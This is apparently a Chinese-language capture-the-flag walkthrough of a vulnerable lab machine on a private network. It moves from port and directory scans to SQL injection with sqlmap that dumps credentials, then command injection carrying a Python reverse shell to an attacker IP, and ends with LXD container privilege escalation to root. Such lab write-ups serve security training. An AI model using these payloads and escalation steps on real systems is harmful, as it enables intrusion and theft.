## 192\.168\.110\.204 拿到ip扫端口

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MWVjNjg1OTQ2OTA0OTRlY2VjZDViNTVhM2Q3YmI3NDNfYzY3ZmI1ZWM1NjNmNTlhMDk3MGI3MmM1NDhkYmYxYzlfSUQ6NzY0OTI2Nzc1NzQzOTQ1NDQxN18xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

80端口开放web服务

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTU5OWIzNGU1YWI2ZDMxMWY4MGJiMzgxZjRhMDE1MWJfMjUyMmZjYThlNmRlMjNiYWY1MmVhZDI4YWNjNzk0ZDNfSUQ6NzY0OTI2NzkxMzc5NDY4NTg4MF8xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

注册时发现admin用户已经存在

先注册一个普通用户

成功登陆后发现给与我们的提示信息，简单的告诉了我们什么是参数污染，但是在这几个界面中未发现参数的传递。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTJhNjkxMWMwODFlNzZkN2NjYWQ2ZTQzODA0MGJjYzFfMGU5NTE4MjlmN2Y2ZDVmNWQ4ODBiZTc2NDk5ZGUzNmFfSUQ6NzY0OTI3MjQxNzM5NTAxODcwMl8xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

## **目录扫描：**

用一健日卫星里面的dirscan扫出来几个目录

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MDEwOGUwYjJlODVkZjY0MjM0Y2JkODk4NmRlMDQ1NDlfYzAwMzE2NmVlZGFmMDJiOGZiZTIzNzEwYjlmN2UxODdfSUQ6NzY0OTI3MDAyMTYzNDQ3NzI5MV8xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

当登录访问history页面发现是空白，但是没登录访问是没找到用户的活动，所以我们猜测user应该是一个参数

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MTYwMmFhMmUwMDQzNDE1NGZiMjNlYTM1YTdkOGNhYmNfZGVmYTdhN2Q4YmJhOTExNTUyN2M4OGQ3NDBjZTIxZDlfSUQ6NzY0OTI3MjkwNzgyNjYxMzIyNl8xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

当我们传输user参数时：http://172\.18\.8\.191/history\.php?user=upfine，这时候又需要我们登录账户才可以，想到注册时告诉我们admin账户已存在，那我们也查看下admin账户信息，给我们返回了一个代码仓库地址：https://github\.com/cyberbot75/keyring。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MDM0MjRiMzg2NjI4Njc1YzE1NDBjNjI0NzdmY2FmNTRfYmI1MmI4N2EzMTAwODVhMmZmMGY2NTI0ODMyODJhMjJfSUQ6NzY0OTI3MjkwNzc4OTI5MDQ1OF8xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmRhMTZjN2UyZDI2YzlmMTdlYTJjOWJiZTZkNzQwNjNfODE3OTE0MzMwZGNiNzU2NTc5ZjYxNmI2YTRmNTUxZTVfSUQ6NzY0OTI3MjkwNDU4MTAwODM3Ml8xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

通过该地址下载下来页面源码信息，在control\.php源码中发现了数据库的账户和密码信息：root/sqluserrootpassw0r4，数据库：users，以及不安全的函数system\(\)。测试该函数是否可以进行命令执行，命令：http://172\.18\.8\.191/control\.php?cmdcntr=id，但是未回显任何信息，猜测是账户权限问题。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NDkzYzRmNmNjNDQzM2Y5NWUzNTRiMGNlZTE3Y2FhNGFfYTdkNzgwZTU2YzQwYjQwODM3ZTBlZmI5ZWRkZWJjYzRfSUQ6NzY0OTI3Mzg3NjU4MzE0MDU0M18xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

## **SQL注入：**

在此页面：http://172\.18\.8\.191/history\.php?user=upfine，进行了简单的注入测试，发现存在注入点。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZWMyZmQzOTFmNTMxNmYyODRmYzhjMzRmOTU0YWFiNTdfM2MxNDI2NTU3YjExMjE3MzgwYTg1MWQyMDIwMTMzYmZfSUQ6NzY0OTI3NDE5MjAyMTc2OTIwMl8xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

那就使用sqlmap获取下表名、列明和具体的数据信息，数据库名称在源码文件中已知：users。sqlmap命令如下，最终发现了两组账户和密码：admin/myadmin\#p4szw0r4d、john/Sup3r$S3cr3t$PasSW0RD。

```Bash
获取表名
sqlmap -u http://172.18.8.191/history.php?user=admin --cookie='PHPSESSID=jno08545neep7psrg6phni549c' --batch -D users --tables
获取表的数据
sqlmap -u http://172.18.8.191/history.php?user=admin --cookie='PHPSESSID=jno08545neep7psrg6phni549c' --batch -D users -T details --dump
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTZjY2JmYjc2YTllMzRhMDhjMDNhODcyOTk2YjNjZjZfOTdmMzA4NzU4ZDliMTBkOTc2NDhiNTYxMjk5NzJlMGZfSUQ6NzY0OTI3NDM3NzEyOTcwODc1OV8xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YzNmZWRjN2M3MTY0ZmYxNzM5M2RkOTAyNDBlZGU1NjFfNGVhMDlmZjYzYzY5ZTc4MmY2Mjc0YzFkYjRlMmY0YWFfSUQ6NzY0OTI3NDQ3MjE2MzQ0NTk2N18xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTUyZjA3OThhYWFhZGQ1NGUzYjYwNzU1MGZlNDc1OTRfNTg3NmViMzFjZTU0YzczM2RjMmFhMGM3NjVjZWFkNTdfSUQ6NzY0OTI3NDU0NjYwNDM0NjMwOF8xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

## **获取shell：**

使用我们获得的账户信息：admin/myadmin\#p4szw0r4d进行登录，然后测试命令执行，此时命令执行成功。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NjRiMTQzOTk5ZTIyYzJiZDJkMTQ4ZWUzMTNjODcyOTRfMjk5ZDcyMzdhYzk0NGU0YjI5MDBlMjgyM2YxNGFjMGJfSUQ6NzY0OTI3NDY3Mjg5ODUxMDAwNV8xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

利用命令执行函数直接反弹shell，命令如下：http://172\.18\.8\.191/control\.php?cmdcntr=python3%20\-c%20%27import%20socket,subprocess,os;s=socket\.socket\(socket\.AF\_INET,socket\.SOCK\_STREAM\);s\.connect\(\(%22172\.18\.8\.120%22,6688\)\);os\.dup2\(s\.fileno\(\),0\);%20os\.dup2\(s\.fileno\(\),1\);os\.dup2\(s\.fileno\(\),2\);import%20pty;%20pty\.spawn\(%22sh%22\)%27，在kali中开启对6688端口的监听，成功获得shell权限。

```Bash
其余几种方式经测试无法反弹shell，可以在这个网站找各语言的反弹shell语句进行测试：https://www.revshells.com/
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.18.8.120",6688));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

## **提权方式一\-lxd提权：**

在/home目录下发现john账户，加上我们之前发现的账户信息：john/Sup3r$S3cr3t$PasSW0RD，那我们就可以直接切换到john账户，成功切换到john账户后发现john账户具有lxd权限。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Y2JjOTkyMjU2M2RiYTNlNmEzOGZhNmUyNDU5YTkxMzRfMDI5ZWVjMzBkZmQwZTQ5YTdiY2YxYzcwN2Q2MzJkYTNfSUQ6NzY0OTI3NDgxMTUwNDUxMjIyNF8xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

切换john账户后，在john目录下发现user\.txt文件，读取该文件成功获取到第一个flag值。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTBhZTQwZDVmOTI0YTU5NjEzMzQyNmY2MjI4NWNkNThfMjM4Y2NiNmJlYzY5NmUyMjNmNTA4MDI5Yzc3NjBkOTRfSUQ6NzY0OTI3NDgxMzMyNDIxNzMyOV8xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)

首先在这个网站：https://github\.com/saghul/lxd\-alpine\-builder\.git下载tar\.gz文件并上传到靶机，命令：wget http://172\.18\.8\.120:8000/alpine\-v3\.13\-x86\_64\.tar\.gz。然后在依次执行如下命令，即可成功获得root权限，获得root权限后进入root目录：cd /mnt/root/root，发现root\.txt文件并读取flag值。

```Bash
lxc image import ./alpine-v3.13-x86_64.tar.gz --alias myimage  
lxd init   #基本默认配置，进行回车就行
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

> 导入本地镜像
> 
> ```Plain Text
> lxc image import ./alpine-v3.13-x86_64.tar.gz --alias myimage
> ```
> 
> - 作用：把你本地的 `alpine 轻量Linux系统包` 导入成 LXC 容器镜像
> 
> - 别名：`myimage`（后面直接用这个名字创建容器）
> 
> - 目的：准备一个能用来提权的最小系统镜像
> 
> ---
> 
> 初始化 LXD 环境（一路回车）
> 
> ```Plain Text
> lxd init
> ```
> 
> - 作用：第一次使用 LXD 必须初始化存储、网络等配置
> 
> - 渗透里：直接全部默认回车即可
> 
> - 目的：让 LXC 命令能正常工作
> 
> ---
> 
> 创建特权容器（关键：提权核心）
> 
> ```Plain Text
> lxc init myimage ignite -c security.privileged=true
> ```
> 
> - `myimage`：用刚才导入的系统
> 
> - `ignite`：给容器起的名字
> 
> - `-c security.privileged=true`：开启最高权限（特权模式）
> 
> - 效果：容器拥有接近宿主机 root 的权限
> 
> ---
> 
> 把宿主机整个磁盘挂载到容器里（最危险一步）
> 
> ```Plain Text
> lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
> ```
> 
> - `source=/`：把宿主机的根目录（整个系统盘）
> 
> - `path=/mnt/root`：挂载到容器内的 `/mnt/root`
> 
> - 效果： ✅ 容器里能看到、修改、删除宿主机的所有文件 ✅ 宿主机的 /etc/shadow、/root、密码、后门随便改 ✅ 等于直接拿到宿主机 root 权限
> 
> ---
> 
> 启动容器
> 
> ```Plain Text
> lxc start ignite
> ```
> 
> ---
> 
> 进入容器拿到 root shell
> 
> ```Plain Text
> lxc exec ignite /bin/sh
> ```
> 
> - 进入容器后，你就是 root
> 
> - 输入： 
> 
> ```Plain Text
> cd /mnt/root
> ```
> 
> - 就能看到宿主机的整个系统文件
> 
> 

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MDE1ZWI3YzY5ZTk3NjIzNWVjOGYwMTM5NGIzNzY5ODBfODc5YjVjNjgwMGMxOGZjNjNlMzc1YjkxYzQ4YzVmNWZfSUQ6NzY0OTI3NDgxNDQzOTgwMzg4Nl8xNzkzOTQzNTc0OjE3OTQwMjk5NzRfVjM)
